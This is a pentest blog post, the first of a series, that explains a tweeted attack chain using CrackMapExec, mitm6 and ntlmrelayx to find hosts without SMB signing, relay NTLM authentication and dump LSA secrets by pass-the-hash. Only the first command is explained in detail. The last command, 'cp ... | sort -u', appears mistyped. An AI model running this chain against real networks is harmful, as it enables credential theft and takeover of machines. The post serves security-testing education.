---
layout: post
title: the power of mitm6 and ntlmrelayx Part 1
subtitle: how on earth does this shit work?
bigimg: /img/tcp-ipv6.jpeg
tags: [network, ipv6, ntlmrelayx, pentest]
date: 2019-11-25
---

## Introduction

When undertaking a pentest engagement we rely heavily on the amazing tools and techniques that have been developed by those who have come before us.  Like the great go-to suites such as metasploit and Burp, or the amazing tools like Responder and crackmapexec, etc.

I recently came across this post from Paul Seekamp ([@nullenc0de](https://twitter.com/nullenc0de?lang=en)):

<p align="center">
<img src="{{site.url}}/img/2019-11-22-nullenc0de.png" alt="drawing" width="300" class="center"/>
</p>

Testing in a lab showed great results so I deployed it on a recent engagement and was amazed at how effective it was.

This post is to try and get my head firmly around the workings of the commands in the process, what they do, and how they work.  Hopefully along the way there might be something in this for my one reader as well.  I think there is a lot to go through so will seperate this in to a separate post for each line.

## Let's begin!

So...  We're editing in markdown here and so to give me something to refer back to while i'm typing, let's shovel out some backticks!

```
$ cme smb $hosts --gen-relay-list relay.txt
$ mitm6 -i eth0 -d $domain
$ ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relay.txt
$ cme smb $hosts -u Administrator  -H $hash -d LOCALHOST --lsa
$ cp /root/.cme/logs/*.secrets |sort -u
```


### Line 1 - `cme smb $hosts --gen-relay-list relay.txt`

OK first up let's break down this command string.

`cme` is the alias for CrackMapExec, a fantastic pentest tool created by [byt3bl33d3r](https://twitter.com/byt3bl33d3r?lang=en) ([CrackMapExec on GitHub](https://github.com/byt3bl33d3r/CrackMapExec)) featuring a collection of subcommands for attacking and enumerating network hosts.

Depending on your Linux distribution and your preffered method of installation you may find that cme is actually a completely different program in your repos.  Personally i tend to use Kali lite which has CME in the repos however it is version 3.x.x and the commands used above need a more recent version (?>4.0.0)which needed to be installed from the bleeding edge repo at time of writing.

This is the current bleeding edge install method for Linux.  I'd recommend checking the GitHub installation page for up to date instructions or for a different OS:

```
#~ apt-get install -y libssl-dev libffi-dev python-dev build-essential
#~ pip install --user pipenv
#~ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
#~ cd CrackMapExec && pipenv install
#~ pipenv shell
#~ python setup.py install
```

`smb` tells CME which protocol to use.  At time of writing CME supports three documented protocols; HTTP, SMB and MSSQL.  If you're anything like me starting your cme command with `cme smb` will be common place.  The purpose of the CME SMB protocol, as per the official documentation, is to 'own stuff using SMB and/or Active Directory'.  The amount of features is incredible, I recommend checking them all out.

`$hosts` is a placeholder for your targets.  You can enter a single IP address, a network address with CIDR, a range of IP addresses, hostnames, FQDN's, or a target file.

`--gen-relay-list` - this command will scan all the targets and generate a list of all those that do not have SMB signing required.  For the uninitiated SMB signing is designed to secure SMB connections between hosts via digital signing, preventing MITM attacks.

`relay.txt` - this is just the output file for --gen-relay-list.

So to sum it all up this command will use CrackMapExec with the SMB protocol to enumerate a bunch of targets and check to see if they have SMB listening on port 445 and if so is SMB signing required?  A lit of all SMB hosts that do not have signing required is outputted to the `relay.txt` file.

### Wondering what's happening under the hood?

To get a more thorough understanding of the execution of this command I ran it through Wireshark (another fantastic tool) to see inside the kimono.

